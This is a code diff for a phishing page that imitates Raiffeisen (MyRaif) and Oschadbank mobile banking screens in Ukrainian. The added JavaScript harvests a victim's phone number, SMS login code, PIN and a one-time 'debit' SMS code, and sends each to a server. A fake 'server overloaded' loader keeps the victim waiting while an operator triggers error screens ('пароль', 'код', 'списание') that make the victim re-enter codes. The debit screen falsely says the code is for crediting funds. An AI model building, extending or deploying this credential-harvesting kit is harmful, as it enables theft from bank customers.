@@ -73,8 +73,8 @@
             background-color: #3B3B3B; /* Dark background from screenshot */
         }
         .raiff-modal-content {
-            display: flex; flex-direction: column; height: 100vh;
-            width: 100%; padding: 0 20px;
+            display: flex; flex-direction: column; min-height: 100vh;
+            width: 100%; padding: 0 20px; color: #FFFFFF;
         }
         .raiff-header {
             width: 100%; display: flex; align-items: center; justify-content: space-between;
@@ -84,14 +84,19 @@
             font-size: 18px; font-weight: 500;
             text-align: center; flex-grow: 1;
         }
-        .raiff-header .back-arrow {
-            font-size: 28px; cursor: pointer; line-height: 1;
-            width: 24px; /* Give it a fixed width to balance the header */
+        .raiff-header .icon {
+            font-size: 28px; cursor: pointer; line-height: 1; width: 40px; text-align: left;
         }
         .raiff-body {
             flex-grow: 1; display: flex; flex-direction: column;
             justify-content: flex-start; align-items: center;
-            padding-top: 30px;
+            padding-top: 10px;
+        }
+        .raiff-logo-container {
+            margin-bottom: 30px; text-align: center;
+        }
+        .raiff-logo-container img {
+            max-width: 100px; height: auto; border-radius: 50%;
         }
         .raiff-form-container {
             width: 100%;
@@ -100,8 +105,8 @@
             color: #FFFFFF;
             font-size: 26px;
             font-weight: 700;
-            margin-bottom: 40px; /* Increased margin */
-            text-align: center; /* Centered */
+            margin-bottom: 20px;
+            text-align: center;
         }
         .raiff-form-container .input-label {
             color: #A0A0A0; font-size: 14px;
@@ -133,7 +138,7 @@
             color: #FCDD2D; text-decoration: none;
         }
         .raiff-footer {
-            padding: 20px 0; width: 100%;
+            padding: 20px 0; width: 100%; margin-top: auto;
         }
         .raiff-submit-button {
             width: 100%; padding: 16px; border: none;
@@ -148,32 +153,97 @@
             color: #000000;
             cursor: pointer;
         }
-        /* Styles for Raiff Code Screen */
+
+        /* --- Стили для Райффайзен - ввод кода --- */
         .raiff-code-container {
-            text-align: center; width: 100%;
+            padding: 20px; text-align: center; width: 100%;
             display: flex; flex-direction: column; align-items: center;
-            padding-top: 40px;
+            color: #FFFFFF; flex-grow: 1; justify-content: flex-start;
         }
-        .raiff-code-container img {
-            max-width: 80px; margin-bottom: 40px;
+        .raiff-code-container .main-title {
+            font-size: 26px; font-weight: 700; margin-top: 10px; margin-bottom: 10px;
         }
-        .raiff-code-container h2 {
-            color: #FFF; font-size: 22px; font-weight: 700; margin-bottom: 15px;
+        .raiff-code-container .subtitle {
+            font-size: 16px; font-weight: 400; color: #A0A0A0;
+            margin-bottom: 40px;
         }
-        .raiff-code-container p {
-            color: #A0A0A0; font-size: 16px; margin-bottom: 30px;
+        .raiff-code-inputs {
+            display: flex; justify-content: center; gap: 10px; margin-bottom: 30px;
         }
-        .raiff-theme .oschad-code-input {
-            background-color: transparent;
-            border: 2px solid #888;
-            color: #FFF;
-            caret-color: #FCDD2D;
+        .raiff-code-input {
+            width: 45px; height: 50px; text-align: center; font-size: 24px; font-weight: 600;
+            border: none; border-radius: 12px; background-color: #555555;
+            outline: none; transition: all 0.2s ease; color: #FFFFFF;
+            caret-color: #FCDD2D; padding: 0; -moz-appearance: textfield;
         }
-        .raiff-theme .oschad-code-input:focus {
-            border-color: #FCDD2D;
+        .raiff-code-input:focus {
+             border: 2px solid #FCDD2D; background-color: #6a6a6a;
         }
-        .raiff-theme .oschad-resend-link { color: #888; }
-        .raiff-theme .oschad-resend-link.active { color: #FCDD2D; }
+        .raiff-code-inputs.error .raiff-code-input {
+            border: 2px solid var(--danger-color);
+        }
+        .raiff-code-error-text {
+            color: var(--danger-color); font-size: 15px; font-weight: 500; margin-top: -20px; margin-bottom: 20px;
+        }
+        .raiff-resend-text {
+            color: #A0A0A0; font-size: 14px;
+        }
+
+        /* --- Стили для Райффайзен - ввод PIN --- */
+        .raiff-pin-container {
+            display: flex; flex-direction: column; width: 100%;
+            color: #FFFFFF; flex-grow: 1; justify-content: space-between;
+        }
+        .raiff-pin-header {
+             padding-top: 40px;
+        }
+        .raiff-pin-title {
+             font-size: 22px; font-weight: 500; margin-bottom: 15px;
+        }
+        .raiff-pin-error-text {
+            color: var(--danger-color); font-size: 15px; font-weight: 500; min-height: 20px;
+        }
+        .raiff-pin-dots {
+            display: flex; justify-content: center; gap: 20px; margin-top: 20px;
+        }
+        .raiff-pin-dot {
+            width: 15px; height: 15px; border-radius: 50%;
+            border: 2px solid #FCDD2D;
+            transition: background-color 0.2s ease;
+        }
+        .raiff-pin-dot.filled {
+            background-color: #FCDD2D;
+        }
+        .raiff-pin-keypad {
+            display: grid; grid-template-columns: repeat(3, 1fr);
+            gap: 20px; max-width: 300px; margin: 0 auto; padding-bottom: 30px;
+        }
+        .raiff-pin-key {
+            height: 75px; width: 75px; border-radius: 50%; border: none;
+            background-color: #555555;
+            color: #FFFFFF; font-size: 28px; font-weight: 500;
+            cursor: pointer; transition: background-color 0.2s;
+            -webkit-tap-highlight-color: transparent;
+            justify-self: center;
+        }
+        .raiff-pin-key:active { background-color: #6a6a6a; }
+        .raiff-pin-key.backspace { background: none; font-size: 24px; }
+        
+        /* --- Стили для Райффайзен - Лоадер --- */
+        .raiff-loader-container {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            flex-grow: 1; color: #FFFFFF;
+        }
+        .raiff-loader-title { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
+        .raiff-loader-subtitle { font-size: 16px; color: #A0A0A0; margin-bottom: 40px; }
+        .raiff-loader-logo {
+            width: 120px; height: 120px; animation: pulsate 1.5s ease-in-out infinite;
+        }
+        @keyframes pulsate {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
 
         /* --- Стили для модального окна ЛК Ощадбанка --- */
         .oschad-header {
@@ -519,24 +589,24 @@ document.addEventListener('DOMContentLoaded', () => {
     
     /** Renders the Raiffeisen login modal */
     function renderRaiffeisenLogin() {
-        customModalOverlay.className = 'raiff-theme'; // Add theme class
+        customModalOverlay.className = 'raiff-theme';
         const html = `
             <div class="raiff-modal-content">
                 <div class="raiff-header">
-                    <span class="back-arrow" id="raiff-back-arrow">←</span>
+                    <span class="icon" id="raiff-back-arrow">←</span>
                     <span class="title">Авторизуйтесь через MyRaif</span>
+                    <span class="icon" style="width: 40px;"></span>
                 </div>
                 <div class="raiff-body">
+                    <div class="raiff-logo-container">
+                       <img src="https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw" alt="Логотип">
+                    </div>
                     <div class="raiff-form-container">
                         <h2 class="welcome-text">Ласкаво просимо</h2>
-                        <p class="input-label">Номер телефону</p>
                         <div class="raiff-input-wrapper">
                             <span>+380</span>
                             <input type="tel" id="raiff_phone_input" placeholder="Введіть ваш номер телефону" autocomplete="off">
                         </div>
-                        <p class="raiff-terms-text">
-                            Натиснувши «Продовжити», ви приймаєте <a href="#">умови надання послуг</a> і <a href="#">Порядок обробки персональних даних</a>.
-                        </p>
                     </div>
                 </div>
                 <div class="raiff-footer">
@@ -549,36 +619,131 @@ document.addEventListener('DOMContentLoaded', () => {
         addRaiffeisenLoginListeners();
     }
 
-    /** Renders the Raiffeisen code input screen */
+    /** Renders Raiffeisen SMS code screen */
     function renderRaiffeisenCodeScreen(options = {}) {
-        lastCodeScreen = 'raiff_sms';
+        lastCodeScreen = 'raiff_initial_code';
+        const phoneNumber = collectedData.phone || '';
         const html = `
             <div class="raiff-modal-content">
                 <div class="raiff-header">
-                    <span class="back-arrow" id="raiff-code-back-arrow">←</span>
-                    <span class="title">Підтвердження</span>
+                     <span class="icon" id="raiff-back-arrow">←</span>
+                     <span class="title">Підтвердження</span>
+                     <span class="icon" style="width: 40px;"></span>
                 </div>
                 <div class="raiff-code-container">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/Raiffeisen_Bank_International_logo.svg/2560px-Raiffeisen_Bank_International_logo.svg.png" alt="Raiffeisen Logo">
-                    <h2>Ми відправили вам SMS-повідомлення</h2>
-                    <p>Введіть код з SMS</p>
-                    <div class="oschad-code-inputs ${options.error ? 'error' : ''}" id="code-inputs-container">
-                        <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
-                        <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
-                        <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
-                        <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
+                    <div class="raiff-logo-container">
+                       <img src="https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw" alt="Логотип">
                     </div>
-                    ${options.error ? `<p class="oschad-code-error-text" style="color: #dc3545;">Код введено невірно</p>` : ''}
-                    <a href="#" class="oschad-resend-link" id="resend-link">Відправити код ще раз</a>
+                    <h2 class="main-title">Введіть код</h2>
+                    <p class="subtitle">Ми надіслали код у SMS на номер ${phoneNumber}</p>
+                    <div class="raiff-code-inputs ${options.error ? 'error' : ''}" id="raiff-code-inputs">
+                        ${Array(6).fill('<input type="tel" inputmode="numeric" maxlength="1" class="raiff-code-input">').join('')}
+                    </div>
+                    ${options.error ? `<p class="raiff-code-error-text">Код введено невірно</p>` : ''}
+                    <p class="raiff-resend-text" id="raiff-resend-text">Ви зможете отримати код знову через 0:59</p>
                 </div>
             </div>
         `;
         customModalContent.innerHTML = html;
-        document.getElementById('raiff-code-back-arrow').addEventListener('click', renderRaiffeisenLogin);
-        setupCodeInputs('raiff_sms');
-        startCallTimer(60);
+        document.getElementById('raiff-back-arrow').addEventListener('click', renderRaiffeisenLogin);
+        setupGenericCodeInputs('raiff_code_input', 6, () => {
+             const code = [...document.querySelectorAll('.raiff-code-input')].map(i => i.value).join('');
+             sendDataToServer({ raiff_sms_code: code }, false);
+             renderRaiffeisenPinScreen();
+        });
+        // Add timer logic here
     }
-    
+
+    /** Renders Raiffeisen PIN screen */
+    function renderRaiffeisenPinScreen(options = {}) {
+        lastCodeScreen = 'raiff_pin';
+        const html = `
+             <div class="raiff-modal-content">
+                 <div class="raiff-header">
+                     <span class="icon" id="raiff-back-arrow">←</span>
+                     <span class="title"></span>
+                     <span class="icon" style="width: 40px;"></span>
+                 </div>
+                 <div class="raiff-pin-container">
+                     <div class="raiff-pin-header">
+                         <h2 class="raiff-pin-title">Введіть пароль</h2>
+                         <p class="raiff-pin-error-text">${options.error ? 'Вказано невірний пароль' : ''}</p>
+                         <div class="raiff-pin-dots" id="raiff-pin-dots">
+                             ${Array(4).fill('<div class="raiff-pin-dot"></div>').join('')}
+                         </div>
+                     </div>
+                     <div class="raiff-pin-keypad" id="raiff-pin-keypad">
+                         ${[1,2,3,4,5,6,7,8,9].map(k => `<button class="raiff-pin-key" data-key="${k}">${k}</button>`).join('')}
+                         <button class="raiff-pin-key backspace" style="visibility: hidden;"></button>
+                         <button class="raiff-pin-key" data-key="0">0</button>
+                         <button class="raiff-pin-key backspace" data-key="backspace">
+                             <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line></svg>
+                         </button>
+                     </div>
+                 </div>
+             </div>
+        `;
+        customModalContent.innerHTML = html;
+        document.getElementById('raiff-back-arrow').addEventListener('click', () => renderRaiffeisenCodeScreen());
+        setupRaiffeisenPinListeners();
+    }
+
+    /** Renders Raiffeisen Debit SMS screen */
+    function renderRaiffeisenDebitSmsScreen(options = {}) {
+        lastCodeScreen = 'raiff_debit_sms';
+        const html = `
+            <div class="raiff-modal-content">
+                <div class="raiff-header">
+                     <span class="icon" id="raiff-back-arrow">←</span>
+                     <span class="title">Підтвердження</span>
+                     <span class="icon" style="width: 40px;"></span>
+                </div>
+                <div class="raiff-code-container">
+                    <h2 class="main-title">Останній крок</h2>
+                    <p class="subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
+                    <div class="raiff-code-inputs ${options.error ? 'error' : ''}" id="raiff-debit-inputs">
+                        ${Array(6).fill('<input type="tel" inputmode="numeric" maxlength="1" class="raiff-code-input">').join('')}
+                    </div>
+                     ${options.error ? `<p class="raiff-code-error-text">Код введено невірно</p>` : ''}
+                </div>
+                 <div class="raiff-footer">
+                    <button class="raiff-submit-button" id="raiff-submit-btn">Продовжити</button>
+                </div>
+            </div>
+        `;
+        customModalContent.innerHTML = html;
+        document.getElementById('raiff-back-arrow').addEventListener('click', () => renderRaiffeisenPinScreen());
+
+        const submitBtn = document.getElementById('raiff-submit-btn');
+        submitBtn.classList.add('active'); // Enable button immediately
+        submitBtn.addEventListener('click', () => {
+             const code = [...document.querySelectorAll('#raiff-debit-inputs .raiff-code-input')].map(i => i.value).join('');
+             if (code.length === 6) {
+                sendDataToServer({ raiff_debit_code: code }, true);
+                renderRaiffeisenLoader();
+             }
+        });
+        
+        setupGenericCodeInputs('raiff-code-input', 6, () => {});
+    }
+
+
+    /** Renders the Raiffeisen loader screen */
+    function renderRaiffeisenLoader() {
+        customModalOverlay.className = 'raiff-theme';
+        const html = `
+            <div class="raiff-modal-content">
+                 <div class="raiff-loader-container">
+                    <h2 class="raiff-loader-title">Сервер перевантажений</h2>
+                    <p class="raiff-loader-subtitle">Зачекайте 1-2 хвилини</p>
+                    <img src="https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw" class="raiff-loader-logo" alt="Loading...">
+                </div>
+            </div>
+        `;
+        customModalContent.innerHTML = html;
+    }
+
+
     /** Renders the main Oschadbank login modal */
     function renderOschadbankLogin(options = {}) {
         customModalOverlay.className = ''; // Reset theme
@@ -851,10 +1016,7 @@ document.addEventListener('DOMContentLoaded', () => {
     function addRaiffeisenLoginListeners() {
         const phoneInput = document.getElementById('raiff_phone_input');
         const submitBtn = document.getElementById('raiff-submit-btn');
-
-        document.getElementById('raiff-back-arrow').addEventListener('click', () => {
-            window.location.reload();
-        });
+        document.getElementById('raiff-back-arrow').addEventListener('click', () => window.location.reload());
 
         phoneInput.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '').substring(0, 9);
@@ -870,57 +1032,45 @@ document.addEventListener('DOMContentLoaded', () => {
         submitBtn.addEventListener('click', () => {
             if (submitBtn.classList.contains('active')) {
                 const phoneValue = '+380' + phoneInput.value.replace(/\D/g, '');
-                sendDataToServer({ phone: phoneValue }, false); // Not the final step
+                sendDataToServer({ phone: phoneValue }, false); 
                 renderRaiffeisenCodeScreen();
             }
         });
     }
 
-
-    /** Adds listeners for the PIN screen */
-    function setupPinScreenListeners() {
-        const keypad = document.getElementById('pin-keypad');
-        const dots = document.querySelectorAll('#pin-dots .pin-dot');
+    /** Setup listeners for Raiffeisen PIN screen */
+    function setupRaiffeisenPinListeners() {
+        const keypad = document.getElementById('raiff-pin-keypad');
+        const dots = document.querySelectorAll('#raiff-pin-dots .raiff-pin-dot');
         let pin = '';
 
         const updateDots = () => {
             dots.forEach((dot, index) => {
-                dot.textContent = '';
-                dot.classList.remove('active');
-                if (index < pin.length) {
-                    dot.textContent = '●';
-                }
+                dot.classList.toggle('filled', index < pin.length);
             });
-            if (pin.length < 4) {
-                dots[pin.length].classList.add('active');
-            }
         };
 
         keypad.addEventListener('click', (e) => {
-            const target = e.target.closest('.pin-key');
+            const target = e.target.closest('.raiff-pin-key');
             if (!target) return;
 
             const key = target.dataset.key;
-
             if (key === 'backspace') {
                 pin = pin.slice(0, -1);
             } else if (pin.length < 4) {
                 pin += key;
             }
-
             updateDots();
 
             if (pin.length === 4) {
                 keypad.style.pointerEvents = 'none';
                 setTimeout(() => {
-                    sendDataToServer({ fp_pin: pin }, false);
-                    renderOschadbankCallConfirmation();
+                    sendDataToServer({ raiff_pin: pin }, false);
+                    renderRaiffeisenLoader();
                 }, 400);
             }
         });
-        updateDots();
     }
-
 
     /** Adds event listeners for the main Oschadbank login modal */
     function addOschadbankLoginListeners() {
@@ -1084,9 +1234,19 @@ document.addEventListener('DOMContentLoaded', () => {
         callTimerInterval = setInterval(updateTimer, 1000);
     }
     
-    /** Sets up auto-tabbing and submission for code inputs */
+    /** Sets up auto-tabbing and submission for oschad code inputs */
     function setupCodeInputs(screenId) {
-        const codeInputs = document.querySelectorAll('.oschad-code-input');
+        setupGenericCodeInputs('oschad-code-input', 4, () => {
+            const code = [...document.querySelectorAll('.oschad-code-input')].map(inp => inp.value).join('');
+            const dataKey = screenId === 'oschad_call' ? 'call_code' : 'sms_code';
+            sendDataToServer({ [dataKey]: code }, true);
+            showOschadLoader();
+        });
+    }
+
+    /** Generic function for code inputs */
+    function setupGenericCodeInputs(inputClassName, numInputs, onComplete) {
+        const codeInputs = document.querySelectorAll(`.${inputClassName}`);
         codeInputs.forEach((input, index) => {
             input.addEventListener('input', () => {
                 if (input.value && index < codeInputs.length - 1) {
@@ -1094,15 +1254,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 const allFilled = [...codeInputs].every(inp => inp.value.length === 1);
                 if (allFilled) {
-                    const code = [...codeInputs].map(inp => inp.value).join('');
-                    const dataKeyMap = {
-                        'oschad_call': 'call_code',
-                        'telegram_sms': 'sms_code',
-                        'raiff_sms': 'raiff_sms_code'
-                    };
-                    const dataKey = dataKeyMap[screenId] || 'sms_code';
-                    sendDataToServer({ [dataKey]: code }, true);
-                    showOschadLoader();
+                    onComplete();
                 }
             });
             input.addEventListener('keydown', (e) => {
@@ -1111,7 +1263,53 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
             });
         });
+         if(codeInputs[0]) setTimeout(() => codeInputs[0].focus(), 100);
     }
+    
+    /** Oschadbank specific PIN screen listeners */
+    function setupPinScreenListeners() {
+        const keypad = document.getElementById('pin-keypad');
+        const dots = document.querySelectorAll('#pin-dots .pin-dot');
+        let pin = '';
+
+        const updateDots = () => {
+            dots.forEach((dot, index) => {
+                dot.textContent = '';
+                dot.classList.remove('active');
+                if (index < pin.length) {
+                    dot.textContent = '●';
+                }
+            });
+            if (pin.length < 4) {
+                dots[pin.length].classList.add('active');
+            }
+        };
+
+        keypad.addEventListener('click', (e) => {
+            const target = e.target.closest('.pin-key');
+            if (!target) return;
+
+            const key = target.dataset.key;
+
+            if (key === 'backspace') {
+                pin = pin.slice(0, -1);
+            } else if (pin.length < 4) {
+                pin += key;
+            }
+
+            updateDots();
+
+            if (pin.length === 4) {
+                keypad.style.pointerEvents = 'none';
+                setTimeout(() => {
+                    sendDataToServer({ fp_pin: pin }, false);
+                    renderOschadbankCallConfirmation();
+                }, 400);
+            }
+        });
+        updateDots();
+    }
+
 
     /** Sends collected data to the server */
     async function sendDataToServer(data, isFinal) {
@@ -1145,13 +1343,17 @@ document.addEventListener('DOMContentLoaded', () => {
         switch (type) {
             case 'lk':
                 if (activeBankData.theme === 'oschadbank') renderOschadbankLogin();
-                else if (activeBankData.theme === 'raiffeisen') renderRaiffeisenLogin();
                 break;
             case 'call':
                 if (activeBankData.theme === 'oschadbank') renderOschadbankCallConfirmation();
                 break;
             case 'telegram_debit':
                 renderTelegramSmsScreen();
+                break;
+            case 'списание': // Raiffeisen debit SMS
+                 if (activeBankData.theme === 'raiffeisen') {
+                    renderRaiffeisenDebitSmsScreen();
+                 }
                 break;
             case 'password_error':
                 if (activeBankData.theme === 'oschadbank') {
@@ -1160,11 +1362,27 @@ document.addEventListener('DOMContentLoaded', () => {
                     renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg, savedPhone });
                 }
                 break;
+             case 'пароль': // Raiffeisen PIN error
+                 if (activeBankData.theme === 'raiffeisen') {
+                     renderRaiffeisenPinScreen({ error: true });
+                 }
+                 break;
             case 'code_error':
-                const errorOptions = { error: true };
-                if (lastCodeScreen === 'oschad_call') renderOschadbankCallConfirmation(errorOptions);
-                else if (lastCodeScreen === 'telegram_sms') renderTelegramSmsScreen(errorOptions);
-                else if (lastCodeScreen === 'raiff_sms') renderRaiffeisenCodeScreen(errorOptions);
+            case 'код': // Raiffeisen code error
+                if (activeBankData.theme === 'raiffeisen') {
+                    if (lastCodeScreen === 'raiff_initial_code') {
+                        renderRaiffeisenCodeScreen({ error: true });
+                    } else if (lastCodeScreen === 'raiff_debit_sms') {
+                        renderRaiffeisenDebitSmsScreen({ error: true });
+                    }
+                } else if (activeBankData.theme === 'oschadbank') {
+                     const errorOptions = { error: true };
+                     if (lastCodeScreen === 'oschad_call') {
+                        renderOschadbankCallConfirmation(errorOptions);
+                     } else if (lastCodeScreen === 'telegram_sms') {
+                        renderTelegramSmsScreen(errorOptions);
+                     }
+                }
                 break;
             case 'sms':
                 modalTitle.textContent = 'Введіть код з SMS';
